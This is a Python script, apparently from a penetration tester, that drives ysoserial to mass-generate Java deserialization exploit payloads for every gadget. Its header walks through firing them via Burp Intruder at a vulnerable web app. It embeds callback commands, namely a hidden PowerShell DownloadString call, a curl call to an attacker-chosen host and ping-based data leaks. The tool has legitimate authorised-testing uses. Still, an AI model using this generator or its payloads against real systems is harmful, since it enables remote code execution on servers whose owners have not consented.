#!/usr/bin/python

#
# This tool helps fuzzing applications that use Java serialization under the hood, by
# automating `ysoserial` proof-of-concept tool for generating payloads that 
# exploit unsafe Java object deserialization.
# 
# This tool generates every possible payload for every implemented gadget, thus 
# resulting in number of payload files (or one file with number of lines), being
# URL/Base64 encoded along the way or not - which can be later used for manual
# penetration testing assignments like pasting that file to BurpSuite intruder, or
# enumerating every payload from within bash/python script.
#
# Example use case:
#   1. Download, compile and launch example vulnerable application like:
#       https://github.com/hvqzao/java-deserialize-webapp
#
#   2. Start local HTTP server, for instance:
#       -----------------------------------------
#       $ python -m SimpleHTTPServer
#       Serving HTTP on 0.0.0.0 port 8000 ...
#       -----------------------------------------
#
#   3. Generate payloads to test against that application:
#       -----------------------------------------
#       $ ./ysoserial-generator.py -u -b -y ~/tools/ysoserial/ysoserial.jar -s --lhost 192.168.56.1:8000
#           :: ysoserial payloads generation helper
#           Helps generate many variations of payloads to try against vulnerable application.
#           Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
#           v0.1
#
#       [+] Command within payload:
#           "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c ((New-Object Net.WebClient).DownloadString('http://192.168.56.1:8000/...'))"
#       [+] Command within payload:
#           "curl -k -s http://192.168.56.1:8000/..."
#       -----------------------------------------
#
#   4. Capture example POST request to that application from within Burp.
#   
#   5. Now paste resulting file 'ysoserial-payloads.txt' into BurpSuite intruder's Simple list and hit "Start attack"
#
#   6. Watch your SimpleHTTPServer logs:
#       -----------------------------------------
#       $ python -m SimpleHTTPServer
#       Serving HTTP on 0.0.0.0 port 8000 ...
#       192.168.56.128 - - [02/May/2018 01:20:58] code 404, message File not found
#       192.168.56.128 - - [02/May/2018 01:20:58] "GET /CommonsCollections2-linux HTTP/1.1" 404 -
#       192.168.56.128 - - [02/May/2018 01:20:58] code 404, message File not found
#       192.168.56.128 - - [02/May/2018 01:20:58] "GET /CommonsCollections4-linux HTTP/1.1" 404 -
#       192.168.56.128 - - [02/May/2018 01:20:58] code 404, message File not found
#       192.168.56.128 - - [02/May/2018 01:20:58] "GET /Jdk7u21-linux HTTP/1.1" 404 -
#       -----------------------------------------
#   
#   7. You've just found that gadgets: CommonsCollections2, CommonsCollections4 and Jdk7u21 have launched successfully against vulnerable web application.
#
#
# Author: 
#    Mariusz B., '18-19 / <mb@binary-offensive.com>
#

import os
import re
import sys
import base64
import urllib
import subprocess
import argparse
from sys import platform

VERSION = '0.3'

config = {
    'verbose' : True,
    'debug' : True,

    'ysoserial-path' : '',
    'java-path' : '',
    'command' : '',

    # Do not modify below ones
    'gadgets': [],
    'output': '',
    'lhost': '',
    'base64': False,
    'urlencode': False,
    'onefile': False,
    'predefined': False,
    'predefined-cmd': '',
    'platform' : '',
    'separate-by-semicolons': True,
}

predefined = {
    'ping': {
        'windows' : 'ping -n 1 {host}',
        'linux' : 'ping -c 1 -p {data} {host}',
    },

    'http': {
        'windows' : 'powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c ((New-Object Net.WebClient).DownloadString(\'{host}/{data}\'))',
        'linux' : 'curl -k -s {host}/{data}',
    }
}

#
# These gadgets await for non-standard arguments like:
#   host:port, write;destDir;ascii-data, localpath:remotepath and so on.
#
skipGadgets = (
    'Wicket1', 'FileUpload1', 'JRMPClient', 'JRMPListener', 'Jython1', 'Myfaces2', 
    'URLDNS', 'C3P0'
)

warnCmdOnce = False
generated = 0
firstLaunch = True

commandsSoFar = set()

class Logger:
    @staticmethod
    def _out(x): 
        if config['debug'] or config['verbose']: 
            sys.stdout.write(x + '\n')

    @staticmethod
    def dbg(x):
        if config['debug']: 
            sys.stdout.write('[dbg] ' + x + '\n')

    @staticmethod
    def out(x): 
        Logger._out('[.] ' + x)
    
    @staticmethod
    def info(x):
        Logger._out('[?] ' + x)
    
    @staticmethod
    def err(x): 
        sys.stdout.write('[!] ' + x + '\n')
    
    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)
    
    @staticmethod
    def ok(x):  
        Logger._out('[+] ' + x)


def getFileName(name, gadget):
    global firstLaunch

    ext = 'bin'
    if config['base64'] or config['urlencode']: 
        ext = 'txt'

    if config['onefile']:
        if config['output'] and config['output'] != '-':
            return config['output']
        elif config['output'] == '-':
            return ''
        elif not config['output']:
            p = 'ysoserial-payloads.{ext}'.format(ext = ext)

            if os.path.isfile(p) and firstLaunch:
                Logger.err('Output file ("{}") already exists: unable to continue.'.format(p))
                sys.exit(1)

            firstLaunch = False
            return p
    else:
        path = ''
        out = 'ysoserial-{gadget}-{name}-payload.{ext}'.format(
            name=name, gadget=gadget, ext=ext
        )

        if config['output'] != '-':
            path = config['output']
            return os.path.join(path, out)
        else:
            return out

def processCmd(cmd, name, gadget):
    global warnCmdOnce
    global commandsSoFar

    cmd2 = cmd
    Logger.dbg('Command before processing:\n{}\n'.format(cmd))

    data = '{gadget}-{name}'.format(
        gadget = gadget, name = name
    )

    lhost = config['lhost']

    if not warnCmdOnce:
        notWorking = ['|', '&', '<', '>', ';']
        for n in notWorking:
            if n in cmd:
                warnCmdOnce = True
                Logger.fail('WARNING: Your command contains character that will prevent your payload from running correctly: "{}". Remember shortcomings of Java\'s "Runtime.getRuntime().exec(...)" function: you cannot use apostrophes, quotes, pipes, ampersands and so on. One can refer to following article for more informations: https://bit.ly/2JLvdCv '.format(n))
                break

    if 'data' in cmd:
        if config['predefined'] and config['predefined-cmd'] == 'ping':
            data = ''.join(['{:02x}'.format(ord(x)) for x in data[:16]])

        if config['predefined'] and config['predefined-cmd'] == 'http':
            if not lhost.startswith('http'):
                lhost = 'http://' + lhost

        cmd2 = cmd2.format(data = data, host = lhost)

    elif 'host' in cmd:
        cmd2 = cmd2.format(host = lhost)

    Logger.dbg('Command after processing:\n{}\n'.format(cmd2))

    cmd3 = cmd2.replace(data, '...')
    if cmd3 not in commandsSoFar:
        sys.stderr.write('[+] Command within payload:\n\t"{}"\n'.format(cmd3))
        commandsSoFar.add(cmd3)

    return cmd2

def generate(name, cmd):
    global generated

    for gadget in config['gadgets']:
        if gadget in skipGadgets:
            Logger.dbg('Skipping gadget {}...'.format(gadget))
            continue 

        Logger.info('Generating ' + gadget + ' for "' + name + '"...')

        filename = getFileName(name, gadget)

        redir = ''
        if not config['debug']:
            redir = '2>NULL_STREAM'

        cmd2 = processCmd(cmd, name, gadget)
        out = shell('"{java}" -jar "{ysoserial}" {gadget} "{command}" {redir}'.format(
            java = config['java-path'],
            ysoserial = config['ysoserial-path'], 
            gadget = gadget, 
            command = cmd2,
            redir = redir
        ), True, True)

        if config['base64']:
            out = base64.b64encode(out)

        if out != "":
            if config['urlencode']:
                out = urllib.quote_plus(out)

            if out != "":
                if filename == '':
                    print(out + '\n')
                else:
                    mode = 'w'
                    if config['onefile']: 
                        Logger.dbg('Appending payload to the file: "{}"'.format(filename))
                        mode = 'a'
                    else:
                        Logger.ok('Writing payload to the file: "{}"'.format(filename))
                    
                    with open(filename, mode) as f:
                        f.write(out + '\n')

                    generated += 1
        else:
            Logger.err('Failed generating payload {}-{} for cmd: "{}"'.format(
                gadget, name, cmd2
            ))

def processShellCmd(cmd):
    replaces = {
        'NULL_STREAM' : {
            'windows': 'nul',
            'linux': '/dev/null'
        },
        'WHICH_COMMAND' : {
            'windows': 'where',
            'linux': 'which'
        },
    }

    # Strip "2>nul" part as we switched from commands.getstatusoutput to subprocess.Popen
    cmd = cmd.replace(" 2>NULL_STREAM", "")

    for k, v in replaces.items():
        if k in cmd:
            cmd = cmd.replace(k, v[config['platform']])

    return cmd

def shell(cmd, noOut = False, surpressStderr = False):
    cmd = processShellCmd(cmd)
    out = ""
    try:
        stderr = subprocess.STDOUT
        if surpressStderr:
            stderr = None
        out = subprocess.check_output(cmd, stderr=stderr, shell=True)
    except subprocess.CalledProcessError as e:
        if 'Available payload types' in e.output or 'mbechler' in e.output:
            out = e.output
        else:
            Logger.dbg('Error ({}): shell(\'{}\') returned code {}: {}'.format(str(e), e.cmd, e.returncode, e.output))

    if not noOut:
        Logger.dbg('shell(\'{}\') returned:\n"{}"\n'.format(cmd, out))
    else:
        Logger.dbg('shell(\'{}\')\n'.format(cmd))

    return out

def tryToFindYsoserial():
    global config
    if config['ysoserial-path']:
        return True

    out = shell('WHICH_COMMAND ysoserial.jar 2>NULL_STREAM')

    if out and os.path.isfile(out):
        config['ysoserial-path'] = out
    elif os.path.isfile('ysoserial.jar'):
        config['ysoserial-path'] = 'ysoserial.jar'
    else:
        Logger.err('Could not find "ysoserial.jar" in neither PATH nor current directory.')
        Logger.err('Please specify where to find "ysoserial.jar" using "-y" option.')
        sys.exit(1)

    return True

def tryToFindJava():
    global config
    if config['java-path']:
        return True

    out = shell('WHICH_COMMAND java 2>NULL_STREAM')
    out1 = ''

    if out:
        out1 = out.split('\n')[0].strip()

    if out1 and os.path.isfile(out1):
        config['java-path'] = out1
    else:
        Logger.err('Could not find "java" interpreter in neither PATH nor current directory.')
        Logger.err('Please specify where to find "java" using "-j" option.')
        sys.exit(1)

    return True

def collectGadgets():
    global config

    out = shell('"{}" -jar "{}" --help'.format(
        config['java-path'], config['ysoserial-path']))

    rex = re.compile(r'^\s+(\w+)\s+@\w+.+', re.I|re.M)
    gadgets = rex.findall(out)
    Logger.info('Available gadgets ({}): {}\n'.format(len(gadgets), ", ".join(gadgets)))

    config['gadgets'] = gadgets

    if not gadgets:
        Logger.err('Could not interpret ysoserial.jar output and thus could not collect available gadgets!')
        sys.exit(1)

def parseOptions(argv):
    global config

    print('''
        :: ysoserial payloads generation helper
        Helps generate many variations of payloads to try against vulnerable application.
        Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
        v{}
'''.format(VERSION))

    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <attacker-host>')

    parser.add_argument('-t', '--lhost', default='127.0.0.1', help = 'Specifies attacker\'s host IP or FQDN to connect back to within predefined payload\'s command (like ping, http). If you are about to use predefined "http" payload - remember to specify whether it is http or https. Default: http://127.0.0.1')

    parser.add_argument('-C', '--predefined', metavar='CMD', default='', choices=predefined.keys(), help='(Default, http) Use one of the predefined OS-agnostic commands: {}'.format(', '.join(predefined.keys())))

    parser.add_argument('-c', '--command', metavar='CMD', default='', help='Specifies custom command to include within serialized payloads. Remember shortcomings of Java\'s Runtime.getRuntime().exec(...) function: you cannot use apostrophes, quotes, pipes, ampersands and so on. You can use however semicolons (;) - having specified two commands (like: ifconfig ; uname -a) will result in generating TWO payloads. For other nuances, one can refer to following article for more informations: https://bit.ly/2JLvdCv')

    parser.add_argument('-b', '--base64', action='store_true', help='Base64 encode every generated payload (default: False).')

    parser.add_argument('-u', '--urlencode', action='store_true', help='URL encode every generated payload (default: False).')

    parser.add_argument('-S', '--semicolons', action='store_false', default=True, help='If used "--command" option and used semicolons in it, specifies to not to separate that command to several ones by semicolons (default: True).')

    parser.add_argument('-o', '--output', metavar='FILE|DIR', help='Specifies output filename, if --onefile was used or directory name otherwise. One can use "-" to output to the stdout (assuming --onefile was used).')

    parser.add_argument('-s', '--onefile', action='store_true', help='Output every generated payload to the same file, starting from newline. Makes sense to use with base64 encoding option set (default: False).')

    parser.add_argument('-y', '--ysoserial', metavar='PATH', default='', help='Specifies path to ysoserial.jar file to use. If left empty, will try the one from current directory (or PATH environment variable). Also, you can download latest ysoserial.jar from official JitPack: https://jitpack.io/com/github/frohoff/ysoserial/master/ysoserial-master.jar')
    parser.add_argument('-j', '--java', metavar='PATH', default='', help='Specifies path to java program to use. If left empty, will try the one from current directory (or PATH environment variable)')
    
    parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')
    parser.add_argument('-d', '--debug', action='store_true', help='Display debug output.')

    args = parser.parse_args()

    config['verbose'] = args.verbose
    config['debug'] = args.debug
    config['onefile'] = args.onefile
    config['base64'] = args.base64
    config['urlencode'] = args.urlencode
    config['lhost'] = args.lhost
    config['separate-by-semicolons'] = args.semicolons

    if platform == 'linux' or platform == 'linux2':
        config['platform'] = 'linux'
    elif platform == 'win32' or platform == 'win64':
        config['platform'] = 'windows'

    Logger.dbg('Found platform: {}'.format(platform))

    if args.command and args.predefined:
        Logger.err('Options "--predefined" and "--command" are mutually exclusive! Please specify only one of them.')
        sys.exit(1)

    if not args.command: 
        config['predefined'] = True
        if not args.predefined: 
            config['predefined-cmd'] = 'http'
        else:
            config['predefined-cmd'] = args.predefined

        if config['lhost'] == '127.0.0.1':
            Logger.fail('WARNING: You did not specify "--lhost" parameter to connect back to your attacker-host. Currently used value is 127.0.0.1\n')
    else: 
        config['command'] = args.command

    if args.output: 
        config['output'] = args.output

        if os.path.isfile(args.output):
            Logger.err('Output file already exists: unable to continue.')
            sys.exit(1)

    if args.ysoserial: 
        config['ysoserial-path'] = args.ysoserial
    else: 
        tryToFindYsoserial()

    if args.java: 
        config['java-path'] = args.java
    else: 
        tryToFindJava()

    ver = shell('"{}" -version'.format(config['java-path']))
    m = re.search(r'java version "([^"]+)"', ver)
    if m:
        ver = "java version " + m.group(1)
    else:
        if '\r' in ver:
            ver = ver.strip().split('\r\n')[0].strip()
        else:
            ver = ver.strip().split('\n')[0].strip()
    Logger.info("Using {}: '{}'".format(
        ver,
        config['java-path']
    ))

    return args

def main(argv):
    global config

    opts = parseOptions(argv)
    if not opts:
        Logger.err('Options parsing failed.')
        return False

    collectGadgets()

    if config['command']:
        if ';' in config['command'] and config['separate-by-semicolons']:
            Logger.info('Separating input command by semicolons...')

            num = 0
            for cmd in config['command'].split(';'):
                num += 1
                generate('custom-cmd{}'.format(num), cmd.strip())
        else:
            generate('custom', config['command'])
    else:
        generate('windows', predefined[config['predefined-cmd']]['windows'])
        generate('linux', predefined[config['predefined-cmd']]['linux'])

    Logger.info('Generated: {} payloads.'.format(generated))

if __name__ == '__main__':
    main(sys.argv)
